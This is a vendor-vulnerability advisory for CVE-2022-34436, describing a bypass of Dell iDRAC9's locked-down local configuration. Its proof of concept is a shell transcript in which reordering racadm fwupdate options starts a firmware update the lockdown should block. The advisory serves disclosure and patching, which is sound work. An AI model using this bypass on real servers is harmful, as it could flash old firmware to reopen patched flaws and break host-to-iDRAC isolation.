---
title: 'Dell: iDRAC Locked-down Configuration Bypass'
severity: Moderate
ghsa_id: GHSA-vv3q-fxxr-mcgf
cve_id: CVE-2022-34436
weaknesses: []
products:
- ecosystem: Dell
  package_name: iDRAC
  affected_versions: v9
  patched_versions: ''
cvss: null
credits: []
---

**Summary**
The Google Cloud Security team identified a bypass of the locked-down configuration Dell provides to mitigate host to iDRAC attack vectors.

**Severity**
Moderate - There is a significant risk of exploitation in deployment scenarios where iDRAC must be protected.  However, there is no evidence to support that this vulnerability has been exploited in the wild yet.

**Proof of Concept**
The team observed that in iDRAC9, `racadm` ` fwupdate` is still possible when the system is locked down via `idrac.localsecurity.localconfig` enabled.
The iDRAC will reject fwupdate commands if the first option is one of:
fwupdate -p
fwupdate -g
fwupdate -f
However the attacker just needs to change the order of command-line options to bypass the check on the iDRAC side. 

``
[root@esxi-111221:~] racadm fwupdate -f 192.168.0.10 test test -d firmimgFIR.d9
ERROR: SWC0245 : Failed to set object value because local configuration using
        RACADM is disabled.
[root@esxi-111221:~] racadm fwupdate -d firmimgFIR.d9 -f 192.168.0.10 test test
FTP firmware update has been initiated. This update process
may take several minutes to complete. Please check the update status
using fwupdate -s command.
``
In systems where host-to-iDRAC isolation is important, an attacker could leverage this vulnerability to flash old firmware versions in order to exploit patched vulnerabilities even when `idrac.localsecurity.localconfig` is enabled.

**Further Analysis**
Vulnerability [patch and advisory](https://www.dell.com/support/kbdoc/en-us/000205346/dsa-2022-265-dell-idrac8-and-dell-idrac9-security-update-for-a-racadm-vulnerability) 

**Timeline**
Date reported:8/25/2022
Date fixed: 11/14/2022
Date disclosed: 12/14/2022